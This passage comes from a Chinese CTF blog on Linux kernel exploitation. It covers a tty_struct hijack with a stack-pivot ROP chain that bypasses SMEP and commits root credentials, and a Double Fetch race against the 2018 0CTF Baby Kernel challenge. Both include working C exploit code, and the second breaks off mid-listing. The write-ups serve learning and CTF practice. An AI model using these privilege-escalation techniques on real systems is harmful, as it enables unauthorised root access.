class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>其中关注的是 <code>const struct tty_operations *ops</code> 指针，该指针指向了结构体 <code>tty_operations</code> （定义如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>如果能劫持掉上面的指针，在对 <code>/dev/ptmx</code> 文件进行 <code>write</code> 或者 <code>read</code> 等操作时就可以跳转我们指定的函数指针执行，有点类似于 <code>FSOP</code> </p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>在劫持的位置先进行第一次迁移，<code>rax</code> 正好是 <code>fake_tty_operation</code> 的地址，于是，我们把栈转移到 <code>fake_tty_operations</code> 里,此处是可以放一少部分 <code>gadget</code> ，用这部分进行第二次迁移，迁移到堆块中的 <code>rop</code> 链上，用 <code>mov cr4,rdi</code> 这个 <code>gadget</code> 来改变 <code>cr4</code> 寄存器的值从而绕过 <code>SMEP</code> 保护，随后打一个 <code>ret2user</code> 即可完成提权。</p>
<p>此处的 <code>EXP</code> 用的是 <a href="https://blog.csdn.net/seaaseesa/article/details/104577501">ha1vk</a>  师傅的，因为这题已经做过了，并且 <code>ha1vk</code> 师傅写的也很详细，再写一遍也没有什么大的改变</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//tty_struct结构体的大小</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"><span class="comment">//mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI 0xffffffff81004d80</span></span><br><span class="line"><span class="comment">//pop rdi ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI 0xffffffff810d238d</span></span><br><span class="line"><span class="comment">//swapgs ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS 0xffffffff81063694</span></span><br><span class="line"><span class="comment">//iretq</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ 0xFFFFFFFF8181A797</span></span><br><span class="line"><span class="comment">//commit_creds函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810a1420</span></span><br><span class="line"><span class="comment">// prepare_kernel_cred</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a1810</span></span><br><span class="line"><span class="comment">//mov rsp, rax;dec ebx;ret，做栈迁移用</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX 0xFFFFFFFF8181BFC5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX 0xffffffff8100ce6e</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//函数指针</span></span><br><span class="line">   <span class="type">void</span> *(*pkc)(<span class="type">int</span>) = (<span class="type">void</span> *(*)(<span class="type">int</span>))PREPARE_KERNEL_CRED;</span><br><span class="line">   <span class="type">void</span> (*cc)(<span class="type">void</span> *) = (<span class="type">void</span> (*)(<span class="type">void</span> *))COMMIT_CREDS;</span><br><span class="line">   <span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">   (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Rooted!!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Root Fail!!\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">size_t</span> user_cs,user_ss,user_flags,user_sp;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*保存用户态的寄存器到变量里*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveUserState</span><span class="params">()</span> &#123;</span><br><span class="line">   __asm__(<span class="string">&quot;mov %cs,user_cs;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %ss,user_ss;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %rsp,user_sp;&quot;</span></span><br><span class="line">           <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">           <span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">           );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;user states have been saved!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//保存用户态寄存器</span></span><br><span class="line">   saveUserState();</span><br><span class="line">   <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span> || fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//申请一个tty_struct大小的堆</span></span><br><span class="line">   ioctl(fd1,<span class="number">0x10001</span>,TTY_STRUCT_SIZE);</span><br><span class="line">   <span class="comment">//释放这个堆</span></span><br><span class="line">   close(fd1);</span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line">   <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = POP_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">   rop[i++] = MOV_CR4_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getRoot;</span><br><span class="line">   rop[i++] = SWAPGS;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = IRETQ;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_flags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> fake_tty_operations[<span class="number">35</span>];</span><br><span class="line">   <span class="comment">/*for (int i=0;i&lt;35;i++) &#123;</span></span><br><span class="line"><span class="comment">      fake_tty_operations[i] = 0xffffffffc0000000 + i;</span></span><br><span class="line"><span class="comment">   &#125;*/</span></span><br><span class="line">   <span class="comment">//这个位置是write函数的指针，经过调试，我们发现当调用这个函数时，rax正好是fake_tty_operation的地址，于是，我们把栈转移到</span></span><br><span class="line">   <span class="comment">//fake_tty_operations里</span></span><br><span class="line">   fake_tty_operations[<span class="number">7</span>] = MOV_RSP_RAX;</span><br><span class="line">   <span class="comment">//栈转移到fake_tty_operations里后，我们继续做一次转移，把转转移到我们的rop数组里，执行ROP</span></span><br><span class="line">   fake_tty_operations[<span class="number">0</span>] = POP_RAX;</span><br><span class="line">   fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>)rop;</span><br><span class="line">   fake_tty_operations[<span class="number">2</span>] = MOV_RSP_RAX;</span><br><span class="line"> </span><br><span class="line">   <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>];</span><br><span class="line">   <span class="comment">//这个操作会申请tty_struct的空间，也就是会申请到我们之前释放的那个堆里，我们可以用fd2来对它操作</span></span><br><span class="line">   <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="comment">//我们先把原始的tty_struct前面的数据读出来，存储</span></span><br><span class="line">   read(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="comment">//修改const struct tty_operations *ops;指针，指向我们伪造的tty_operations</span></span><br><span class="line">   fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_tty_operations;</span><br><span class="line">   <span class="comment">//把篡改过的tty_struct写回去</span></span><br><span class="line">   write(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">   write(fd_tty,buf,<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.secpulse.com/archives/175110.html">Kernel pwn 基础教程之 ret2usr 与 bypass_smep - SecPulse.COM | 安全脉搏</a></p>
<p><a href="https://blog.csdn.net/qq_40827990/article/details/98937960">(47条消息) Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep_钞sir的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/seaaseesa/article/details/104577501">(47条消息) linux kernel pwn学习之伪造tty_struct执行任意函数_ha1vk的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_40827990/article/details/98520140?spm=1001.2014.3001.5502">(47条消息) Linux Kernel Exploit 内核漏洞学习(2)-ROP_钞sir的博客-CSDN博客</a></p>
<p><a href="https://ama2in9.top/2020/09/03/kernel/">Kernel Pwn从入门到放弃 | Ama2in9</a></p>
<p><a href="https://x3h1n.github.io/2019/07/04/2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/">2018强网杯 core | X3h1n</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>kernel-ROP</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 kernel-Double Fetch 的学习总结</title>
    <url>/posts/6176bce9.html</url>
    <content><![CDATA[<blockquote>
<p><code>Double Fetch</code> 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。</p>
<p>在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 <code>copy_from_user</code> 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但<strong>在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常</strong>。</p>
<p>一个典型的 <code>Double Fetch</code> 漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p>
</blockquote>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041615674.png" alt="image-20230404161502570" style="zoom:50%;" />

<span id="more"></span>

<p>因为 <code>CTF wiki</code> 上这里总结的非常好（建议反复阅读 QAQ ），即使再叙述一遍也感觉意义不大，所以这里直接进行了引用</p>
<p>原文链接：<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/">Double Fetch - CTF Wiki (ctf-wiki.org)</a></p>
<h3 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h3><p>题目链接：<a href="https://github.com/cc-sir/ctf-challenge/tree/master/2018%200CTF%20Finals%20Baby%20Kernel">https://github.com/cc-sir/ctf-challenge/tree/master/2018%200CTF%20Finals%20Baby%20Kernel</a></p>
<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="SMAP-x2F-SMEP"><a href="#SMAP-x2F-SMEP" class="headerlink" title="SMAP&#x2F;SMEP"></a>SMAP&#x2F;SMEP</h5><p><code>SMAP</code> 即<code>管理模式访问保护</code>（Supervisor Mode Access Prevention），当开启这个保护后，在内核模式下无论是写入或者读取用户模式下的数据都会造成内存异常。<code>SMEP</code> （Supervisor Mode Execution Prevention）则是 <code>管理模式执行保护</code>，阻止内核空间中执行用户空间的数据。</p>
<h5 id="启动文件的设置"><a href="#启动文件的设置" class="headerlink" title="启动文件的设置"></a>启动文件的设置</h5><p><code>lsmod</code> 命令查看模块基地址为 <code>0</code> ，需要本地调试的时候修改 <code>init</code> 文件（改完之后，再将文件系统打包），将原本的 <code>setsid cttyhack setuidgid 1000 sh</code> 改为 <code>setsid cttyhack setuidgid 0 sh</code> 即可。</p>
<p>关闭 <code>kaslr</code> 的话，在 <code>start.sh</code> 文件的此处加上 <code>nokaslr</code> 即可（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303292040104.png" alt="image-20230329204004810"></p>
<p>内核中以 <code>printk</code> 输出的内容，可以通过 <code>dmesg</code> 命令查看。前提是需要关闭 <code>dmesg_restrict</code> ，否则无法查看 <code>printk</code> 信息，关闭方法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure>

<p>系统内核参数 <code>kernel.dmesg_restrict</code> 用于控制普通用户是否可以查看内核日志 <code>dmesg</code>。当该参数值为1时，只有 <code>root</code> 用户才能查看内核日志，而普通用户则无法查看。而将该参数值设置为0，允许普通用户查看内核日志。</p>
<p><strong>注意：本题由于从内核中访问了用户态的数据，所以要关闭 <code>SMAP</code> 保护，否则会导致 <code>kernel panic</code></strong></p>
<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>当 <code>a2</code> 为 <code>0x1337</code> 会做三个检查</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031554946.png" alt="image-20230403155425780"></p>
<p>发现第一个 <code>_chk_range_not_ok</code> 函数的第三个参数是 <code>(&amp;current_task) + 0x1358</code> ，这个位置是 <code>stack pointer</code> 字段，记录了栈区的结束地址，也就是用户空间的最大范围。通过调试也可以印证（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031742899.png" alt="image-20230403174212778"></p>
<p><code>_chk_range_not_ok</code> 函数是第一个参数加第二个参数大于第三个参数的情况下返回 <code>True</code>  ，但该函数的外面还有一个 <code>!</code> ，所以这里的想过 <code>if</code> 的话，需要满足第一个参数加第二个参数小于第三个参数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032107333.png" alt="image-20230403210735151" style="zoom:67%;" />



<p>这里出现了一个 <code>*(_QWORD *)v5</code> 和 <code>*(int *)(v5+8)</code> ，这个格式可以推断出来他们是结构体中的成员变量，因为拿 <code>*(_DWORD)(v5+8)</code> 去和 <code>flag</code> 的长度做了比较，可以猜测 <code>*(_DORD)(v5+8)</code> 是 我们输入<code>flag</code> 字符串的长度，结合前面分析 <code>_chk_range_not_ok</code> 函数第三个参数是用户空间的最大范围，所以这里是某个值加上输入字符串的长度，要小于用户区的最大范围，因此推断这个值应该是我们输入 <code>flag</code> 的起始地址</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032113941.png" alt="image-20230403211351891"></p>
<p>所以创建一个结构体，此时的代码如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040927250.png" alt="image-20230404092707055"></p>
<p>查看下面的代码知道 <code>v2</code> 就是 <code>rdx</code> ，也就是 <code>baby_ioctl</code> 函数第三个参数，后来将这个参数赋值为 <code>v5</code> ，因此在用户模式调用 <code>baby_ioctl</code> 函数时，第三个参数传入提前写好的结构体的指针即可。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040928159.png" alt="image-20230404092839113"></p>
<p>最后完整的分析一遍 <code>baby_ioctl</code> 函数（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040933400.png" alt="image-20230404093312297"></p>
<p>在调用 <code>ioctl</code> 的时候，第二个参数如果为 <code>0x6666</code> 则会泄露出内核中存放 <code>flag</code> 的地址。</p>
<p>如果第二个参数为 <code>0x1337</code> 并且第三个参数加上 <code>0x10</code> 小于用户区的最大空间并且第三个参数加上字符串的长度小于用户区的最大空间并且字符串的长度（这个长度并非真的是字符串的实际长度，而是结构体中 <code>length</code> 成员的值）要等于内核中存放的 <code>flag</code> 长度，就去遍历 <code>flag_addr</code> 与 真正的 <code>flag</code> 做对比，如果完全一样则将 <code>flag</code> 输出出来。</p>
<h4 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h4><p>正常分析代码的话，确实找不到漏洞。这个程序希望我们拿用户态程序中的 <code>flag</code> 和内核中 <code>flag</code> 做对比，只有完全一样才输出 <code>flag</code>，程序专门检测了用户态程序中 <code>flag</code> 的地址是否位于用户区内。现在的情况做成图片（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041028572.png" alt="image-20230404102814465"></p>
<p>我们传入 <code>ioctl</code> 函数第三个参数是 <code>0x601100</code> （地址只是举个例子）也就是结构体的地址，结构体第一个成员是指针 <code>ptr</code>，只有 <code>ptr</code> 在用户区内（也就是为 <code>flag in the user_space</code>）才能通过第一个检查，不过这样就没办法通过第二个检查了，因为我们不可能碰巧在用户区自定义的 <code>flag</code> 和内核中的 <code>flag</code> 一样。</p>
<p>可是如果我们开启一个线程，在程序通过第一个检查后，不断将 <code>ptr</code> 改成 <code>flag in the kernel_space</code> （提前将内核中的 <code>flag</code> 地址泄露出来），这样到了第二个检查时，程序会将内核中的 <code>flag</code> 与自己做检查，从而绕过第二个检查，输出 <code>flag</code> 。问题在于我们不确定什么时候程序通过了第一个检查，所以要写一个循环，不断执行 <code>ioctl</code> ，同时开启线程也不断循环去改变 <code>ptr</code> ，当碰巧程序通过了第一个检查时，线程正好也将 <code>ptr</code> 改变成了 <code>flag in the kernel_space</code> ，此时得到 <code>flag</code> </p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc exp.c -o exp -w -static -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> true_flag_address;</span><br><span class="line"><span class="type">int</span> over=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">char</span> *flag;</span><br><span class="line">	<span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_flag</span><span class="params">(<span class="type">void</span> *a)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">info</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> info *)a;</span><br><span class="line">    <span class="keyword">while</span> (over==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        s-&gt;flag = (<span class="type">char</span> *)true_flag_address;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;debug1 %d \n&quot;</span>,s-&gt;length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">info</span> <span class="title">flag_info</span>;</span></span><br><span class="line">    <span class="type">pthread_t</span> tt;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    